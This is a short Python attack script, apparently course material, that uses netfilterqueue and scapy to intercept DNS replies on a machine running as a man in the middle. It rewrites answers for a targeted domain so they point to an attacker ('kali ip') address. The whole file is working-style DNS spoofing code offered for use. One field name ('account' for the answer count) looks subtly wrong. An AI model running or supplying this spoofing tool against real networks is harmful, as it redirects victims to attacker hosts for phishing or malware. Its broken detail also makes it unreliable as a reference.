#!/usr/bin/env python
#create iptable before run


import netfilterqueue
import scapy.all as scapy

print("Spoofing DNS...")
def read_packet(packet):
  scapy_packet = scapy.IP(packet.get_payload())
  if scapy_packet.haslayer(scapy.DNSRR):
    qname  = scapy_packet[scapy.DNSRR].qname
    if "url" in qname:
      print ("[+] Spoofing target")
      answer = scapy.DNSRR(rrname=qname, rdata="kali ip")
      scapy_packet[scapy.DNS].an = answer
      scapy_packet[scapy.DNS].account = 1

      del scapy_packet[scapy.IP].len
      del scapy_packet[scapy.IP].chksum
      del scapy_packet[scapy.UDP].len
      del scapy_packet[scapy.UDP].chksum

      packet.set_payload(str(scapy_packet))

  packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, read_packet)
queue.run()